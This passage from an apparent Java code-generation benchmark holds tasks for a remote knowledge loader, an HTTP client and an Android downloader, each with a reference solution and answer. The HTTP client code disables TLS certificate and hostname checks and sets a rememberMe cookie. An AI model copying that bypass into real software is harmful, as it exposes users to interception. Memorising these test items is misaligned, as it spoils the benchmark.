InputStreamReader(inputStream,\"utf-8\");\n            bufferedReader = new BufferedReader(inputStreamReader);\n            String line = null;\n            StringBuilder sb = new StringBuilder();\n            while ((line = bufferedReader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        } catch (Exception e) {\n            throw new RuleException(e);\n        } finally {\n            try {\n                if(writer != null){\n                    writer.close();\n                }\n                if(bufferedReader != null){\n                    bufferedReader.close();\n                }\n                if(inputStreamReader != null){\n                    inputStreamReader.close();\n                }\n                if(inputStream != null){\n                    inputStream.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            if(connection != null){\n                connection.disconnect();\n            }\n        }\n    }\n\n    public void setResporityServerUrl(String resporityServerUrl) {\n        if(StringUtils.isEmpty(resporityServerUrl) || resporityServerUrl.equals(\"urule.resporityServerUrl\")){\n            return;\n        }\n        if(resporityServerUrl.endsWith(\"/\")){\n            resporityServerUrl += \"urule/loadknowledge\";\n        }else{\n            resporityServerUrl += \"/urule/loadknowledge\";\n        }\n        this.resporityServerUrl = resporityServerUrl;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class RemoteServiceImpl {\n    private String resporityServerUrl;\n    private Logger log;\n\n    public RemoteServiceImpl(Logger log) {\n        this.log = log;\n    }\n\n    public KnowledgePackage getKnowledge(String packageId, String timestamp) {\n        try {\n            String response = sendRequest(packageId, timestamp);\n            return parseResponse(response);\n        } catch (Exception e) {\n            log.error(\"Failed to retrieve knowledge package: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    private String sendRequest(String packageId, String timestamp) throws Exception {\n        if (resporityServerUrl == null || !resporityServerUrl.endsWith(\"/\")) {\n            setResporityServerUrl(resporityServerUrl);\n        }\n        String requestUrl = resporityServerUrl + \"knowledge/\" + packageId + \"?timestamp=\" + timestamp;\n\n        URL url = new URL(requestUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != 200) {\n            throw new RuntimeException(\"HTTP error code: \" + responseCode);\n        }\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        StringBuilder content = new StringBuilder();\n\n        while ((inputLine = in.readLine()) != null) {\n            content.append(inputLine);\n        }\n\n        in.close();\n        conn.disconnect();\n\n        return content.toString();\n    }\n\n    private void setResporityServerUrl(String resporityServerUrl) {\n        if (!resporityServerUrl.endsWith(\"/\")) {\n            this.resporityServerUrl = resporityServerUrl + \"/\";\n        } else {\n            this.resporityServerUrl = resporityServerUrl;\n        }\n    }\n\n    private KnowledgePackage parseResponse(String response) {\n        // Placeholder for actual parsing logic\n        return new KnowledgePackage();\n    }\n}\n```"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a Java HTTP client class that handles HTTP/HTTPS requests with support for proxies, custom headers, cookies, and request body configuration. The class should manage SSL verification, connection timeouts, and proper resource cleanup.\n\nClass Description: The HttpClient class provides functionality to send HTTP requests and receive responses. It handles SSL certificate verification (with optional bypass), proxy configuration, request customization, and response processing. The class maintains static configuration and includes utility methods for connection management.\n\nAttributes:\n\nconfig: [Config] - Singleton instance holding configuration settings like proxy information and cookie names\n\nMethods:\n\nsendRequest: [sendRequest]([HttpRequestInfo httpRequestInfo, String cookieValue]) -> [String] - Main method to send HTTP requests. Takes request info and cookie value, returns response body as string or null on failure.\n\ncreateConnection: [createConnection]([HttpRequestInfo httpRequestInfo]) -> [HttpURLConnection] - Creates and returns a connection object, optionally through a proxy if configured.\n\nconfigureRequest: [configureRequest]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue]) -> [void] - Configures request method, headers, and cookies on the connection object.\n\nconfigureCookie: [configureCookie]([Map<String,String> headers, String cookieValue]) -> [void] - Handles cookie manipulation in request headers.\n\nsendRequestBody: [sendRequestBody]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo]) -> [void] - Sends request body data if present in the request info.\n\ncloseResources: [closeResources]([HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos]) -> [void] - Safely closes all connection-related resources.",
    "Canonical_solution": "import javax.net.ssl.*;\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class HttpClient {\n    private static Config config = Config.getInstance();\n\n    static {\n        try {\n            SSLContext sslcontext = SSLContext.getInstance(\"SSL\");\n            sslcontext.init(null, new TrustManager[]{new MyX509TrustManager()}, null);\n            HostnameVerifier ignoreHostnameVerifier = (s, sslsession) -> true;\n            HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());\n        } catch (NoSuchAlgorithmException | KeyManagementException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            connection = createConnection(httpRequestInfo);\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n\n            connection.setConnectTimeout(20000);\n            connection.setReadTimeout(20000);\n            connection.connect();\n\n            inputStream = connection.getInputStream();\n            if (inputStream.available() > 0) {\n                byte[] buffer = new byte[inputStream.available()];\n                inputStream.read(buffer);\n                baos.write(buffer, 0, buffer.length);\n            }\n        } catch (Exception e) {\n            return null;\n        } finally {\n            closeResources(connection, inputStream, baos);\n        }\n        return baos.toString();\n    }\n\n    private static HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) throws IOException {\n        if (config.isProxyEnabled()) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyIP(), config.getProxyPort()));\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection(proxy);\n        } else {\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection();\n        }\n    }\n\n    private static void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) {\n        connection.setRequestMethod(httpRequestInfo.getRequestMethod());\n        Map<String, String> headers = new HashMap<>();\n        if (httpRequestInfo.getHeaders().size() > 0) {\n            headers.putAll(httpRequestInfo.getHeaders());\n        } else {\n            headers.put(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\");\n        }\n        configureCookie(headers, cookieValue);\n        headers.forEach(connection::setRequestProperty);\n        connection.setRequestProperty(\"connection\", \"close\");\n    }\n\n    private static void configureCookie(Map<String, String> headers, String cookieValue) {\n        String cookie = headers.get(\"Cookie\");\n        if (cookie == null) {\n            headers.put(\"Cookie\", config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else if (!cookie.contains(config.getRememberMeCookieName() + \"=\")) {\n            headers.put(\"Cookie\", cookie + \"; \" + config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else {\n            int start = cookie.indexOf(config.getRememberMeCookieName()) + config.getRememberMeCookieName().length() + 1;\n            int end = cookie.indexOf(\";\", start);\n            end = end == -1 ? cookie.length() : end;\n            headers.put(\"Cookie\", cookie.substring(0, start) + cookieValue + cookie.substring(end));\n        }\n    }\n\n    private static void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        String requestBody = httpRequestInfo.getRequestBody();\n        if (requestBody != null && !requestBody.trim().equals(\"\")) {\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            PrintWriter printWriter = new PrintWriter(connection.getOutputStream());\n            printWriter.write(requestBody);\n            printWriter.flush();\n        }\n    }\n\n    private static void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        try {\n            if (connection != null) connection.disconnect();\n            if (inputStream != null) inputStream.close();\n            if (baos != null) baos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Map;\nimport javax.net.ssl.*;\n\npublic class HttpClient {\n    private static final Config config = Config.getInstance();\n\n    public String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        HttpURLConnection connection = createConnection(httpRequestInfo);\n        if (connection == null) return null;\n\n        try {\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n\n            int responseCode = connection.getResponseCode();\n            InputStream inputStream = (responseCode >= 400)\n                    ? connection.getErrorStream()\n                    : connection.getInputStream();\n\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                baos.write(buffer, 0, bytesRead);\n            }\n\n            closeResources(connection, inputStream, baos);\n            return baos.toString(\"UTF-8\");\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) {\n        URL url;\n        try {\n            url = new URL(httpRequestInfo.getUrl());\n            Proxy proxy = getProxy();\n            HttpURLConnection connection;\n            if (proxy != null) {\n                connection = (HttpURLConnection) url.openConnection(proxy);\n            } else {\n                connection = (HttpURLConnection) url.openConnection();\n            }\n\n            if (config.isSslVerificationBypass()) {\n                disableSslVerification(connection);\n            }\n            return connection;\n        } catch (IOException | KeyManagementException | NoSuchAlgorithmException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) throws IOException {\n        connection.setRequestMethod(httpRequestInfo.getMethod().name());\n        connection.setConnectTimeout(config.getConnectionTimeout());\n        connection.setReadTimeout(config.getReadTimeout());\n\n        Map<String, String> headers = httpRequestInfo.getHeaders();\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n\n        if (cookieValue != null && !cookieValue.isEmpty()) {\n            configureCookie(headers, cookieValue);\n            connection.setRequestProperty(\"Cookie\", cookieValue);\n        }\n\n        if (httpRequestInfo.getBody() != null && !httpRequestInfo.getBody().isEmpty()) {\n            connection.setDoOutput(true);\n        }\n    }\n\n    private void configureCookie(Map<String, String> headers, String cookieValue) {\n        if (headers.containsKey(\"Cookie\")) {\n            headers.put(\"Cookie\", headers.get(\"Cookie\") + \"; \" + cookieValue);\n        } else {\n            headers.put(\"Cookie\", cookieValue);\n        }\n    }\n\n    private void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        if (httpRequestInfo.getBody() != null && !httpRequestInfo.getBody().isEmpty()) {\n            try (OutputStream os = connection.getOutputStream()) {\n                os.write(httpRequestInfo.getBody().getBytes(\"UTF-8\"));\n            }\n        }\n    }\n\n    private void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        try {\n            if (inputStream != null) inputStream.close();\n            if (baos != null) baos.close();\n            if (connection != null) connection.disconnect();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private Proxy getProxy() {\n        String proxyHost = config.getProxyHost();\n        int proxyPort = config.getProxyPort();\n        if (proxyHost == null || proxyPort <= 0) return null;\n        return new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));\n    }\n\n    private void disableSslVerification(HttpURLConnection connection) throws NoSuchAlgorithmException, KeyManagementException {\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, new TrustManager[]{new X509TrustManager() {\n            public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {}\n            public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {}\n            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }\n        }}, new java.security.SecureRandom());\n\n        ((HttpsURLConnection) connection).setSSLSocketFactory(sslContext.getSocketFactory());\n        ((HttpsURLConnection) connection).setHostnameVerifier((hostname, session) -> true);\n    }\n}\n```"
  },
  {
    "Task_id": 99,
    "Instruction": "Task Description: Create a class that handles fetching MIME types from URLs and managing download requests using Android's DownloadManager.\n\nClass Description: The FetchUrlMimeType class is responsible for determining the MIME type of a resource at a given URL, setting up a download request with appropriate parameters, and enqueuing the download using Android's DownloadManager. It handles HTTP connections, processes response headers, and manages file naming and destination.\n\nAttributes:\n- mRequest: [DownloadManager.Request] - The download request to be configured and enqueued\n- mDownloadManager: [DownloadManager] - The Android DownloadManager instance used to enqueue downloads\n- mUri: [String] - The URL of the resource to be downloaded\n- mCookies: [String] - Optional cookies to be included in the HTTP request\n- mUserAgent: [String] - The user agent string to be used in the HTTP request\n\nMethods:\n- Constructor: [FetchUrlMimeType](DownloadManager downloadManager, DownloadManager.Request request, String uri, String cookies, String userAgent) -> [void] - Initializes the class with download manager, request, URI, cookies, and user agent\n- create: [create]() -> [Single<Result>] - Creates and executes the download process, returning a Single observable with the result status. This method:\n  1. Establishes an HTTP connection to the URL\n  2. Extracts MIME type and content disposition from headers\n  3. Configures the download request with proper MIME type and filename\n  4. Enqueues the download request\n  5. Returns success/failure status through the observable\n\nNested Enum:\n- Result: [enum] - Represents possible outcomes of the download enqueue operation:\n  - FAILURE_ENQUEUE: Failed to enqueue the download request\n  - FAILURE_LOCATION: Failed due to storage location issues\n  - SUCCESS: Download successfully enqueued",
    "Canonical_solution": "import android.app.DownloadManager;\nimport android.os.Environment;\nimport android.util.Log;\nimport android.webkit.MimeTypeMap;\nimport android.webkit.URLUtil;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nimport acr.browser.lightning.utils.Utils;\nimport androidx.annotation.NonNull;\nimport io.reactivex.rxjava3.core.Single;\n\nclass FetchUrlMimeType {\n\n    private static final String TAG = \"FetchUrlMimeType\";\n\n    private final DownloadManager.Request mRequest;\n    private final DownloadManager mDownloadManager;\n    private final String mUri;\n    private final String mCookies;\n    private final String mUserAgent;\n\n    public FetchUrlMimeType(DownloadManager downloadManager,\n                            DownloadManager.Request request,\n                            String uri,\n                            String cookies,\n                            String userAgent) {\n        mRequest = request;\n        mDownloadManager = downloadManager;\n        mUri = uri;\n        mCookies = cookies;\n        mUserAgent = userAgent;\n    }\n\n    public Single<Result> create() {\n        return Single.create(emitter -> {\n            String mimeType = null;\n            String contentDisposition = null;\n            HttpURLConnection connection = null;\n            try {\n                URL url = new URL(mUri);\n                connection = (HttpURLConnection) url.openConnection();\n                if (mCookies != null && !mCookies.isEmpty()) {\n                    connection.addRequestProperty(\"Cookie\", mCookies);\n                    connection.setRequestProperty(\"User-Agent\", mUserAgent);\n                }\n                connection.connect();\n                if (connection.getResponseCode() == 200) {\n                    String header = connection.getHeaderField(\"Content-Type\");\n                    if (header != null) {\n                        mimeType = header;\n                        final int semicolonIndex = mimeType.indexOf(';');\n                        if (semicolonIndex != -1) {\n                            mimeType = mimeType.substring(0, semicolonIndex);\n                        }\n                    }\n                    String contentDispositionHeader = connection.getHeaderField(\"Content-Disposition\");\n                    if (contentDispositionHeader != null) {\n                        contentDisposition = contentDispositionHeader;\n                    }\n                }\n            } catch (@NonNull IllegalArgumentException | IOException ex) {\n                if (connection != null)\n                    connection.disconnect();\n            } finally {\n                if (connection != null)\n                    connection.disconnect();\n            }\n\n            if (mimeType != null) {\n                if (mimeType.equalsIgnoreCase(\"text/plain\")\n                    || mimeType.equalsIgnoreCase(\"application/octet-stream\")) {\n                    String newMimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(\n                        Utils.guessFileExtension(mUri));\n                    if (newMimeType != null) {\n                        mRequest.setMimeType(newMimeType);\n                    }\n                }\n                final String filename = URLUtil.guessFileName(mUri, contentDisposition, mimeType);\n                mRequest.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename);\n            }\n\n            try {\n                mDownloadManager.enqueue(mRequest);\n                emitter.onSuccess(Result.SUCCESS);\n            } catch (IllegalArgumentException e) {\n                Log.e(TAG, \"Unable to enqueue request\", e);\n                emitter.onSuccess(Result.FAILURE_ENQUEUE);\n            } catch (SecurityException e) {\n                emitter.onSuccess(Result.FAILURE_LOCATION);\n            }\n        });\n    }\n\n    enum Result {\n        FAILURE_ENQUEUE,\n        FAILURE_LOCATION,\n        SUCCESS\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport android.app.DownloadManager;\nimport android.content.Context;\nimport android.net.Uri;\nimport android.os.Environment;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\nimport io.reactivex.Single;\nimport io.reactivex.SingleEmitter;\nimport io.reactivex.SingleOnSubscribe;\n\npublic class FetchUrlMimeType {\n    private DownloadManager mDownloadManager;\n    private DownloadManager.Request mRequest;\n    private String mUri;\n    private String mCookies;\n    private String mUserAgent;\n\n    public enum Result {\n        FAILURE_ENQUEUE, FAILURE_LOCATION, SUCCESS\n    }\n\n    public FetchUrlMimeType(DownloadManager downloadManager, DownloadManager.Request request, String uri, String cookies, String userAgent) {\n        this.mDownloadManager = downloadManager;\n        this.mRequest = request;\n        this.mUri = uri;\n        this.mCookies = cookies;\n        this.mUserAgent = userAgent;\n    }\n\n    public Single<Result> create() {\n        return Single.create(new SingleOnSubscribe<Result>() {\n            @Override\n            public void subscribe(SingleEmitter<Result> emitter) throws Exception {\n                HttpURLConnection connection = null;\n                try {\n                    URL url = new URL(mUri);\n                    connection = (HttpURLConnection) url.openConnection();\n                    if (mUserAgent != null && !mUserAgent.isEmpty()) {\n                        connection.setRequestProperty(\"User-Agent\", mUserAgent);\n                    }\n                    if (mCookies != null && !mCookies.isEmpty()) {\n                        connection.setRequestProperty(\"Cookie\", mCookies);\n                    }\n                    connection.setRequestMethod(\"GET\");\n                    connection.setConnectTimeout(15000);\n                    connection.setReadTimeout(15000);\n                    connection.connect();\n\n                    int responseCode = connection.getResponseCode();\n                    if (responseCode == HttpURLConnection.HTTP_OK) {\n                        String mimeType = connection.getContentType();\n                        String disposition = connection.getHeaderField(\"Content-Disposition\");\n\n                        String filename = \"download\";\n                        if (disposition != null) {\n                            filename = disposition.split(\"filename=\")[1].replaceAll(\"\\\"\", \"\");\n                        } else {\n                            filename = Uri.parse(mUri).getLastPathSegment();\n                        }\n\n                        mRequest.setTitle(filename);\n                        mRequest.setDescription(\"Downloading file...\");\n                        mRequest.setMimeType(mimeType);\n                        mRequest.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename);\n\n                        long enqueueId = mDownloadManager.enqueue(mRequest);\n                        if (enqueueId > 0) {\n                            emitter.onSuccess(Result.SUCCESS);\n                        } else {\n                            emitter.onSuccess(Result.FAILURE_ENQUEUE);\n                        }\n                    } else {\n                        emitter.onSuccess(Result.FAILURE_ENQUEUE);\n                    }\n                } catch (IOException e) {\n                    emitter.onSuccess(Result.FAILURE_ENQUEUE);\n                } finally {\n                    if (connection != null) {\n                        connection.disconnect();\n                    }\n                }\n            }\n        });\n    }\n}\n```"
  }
]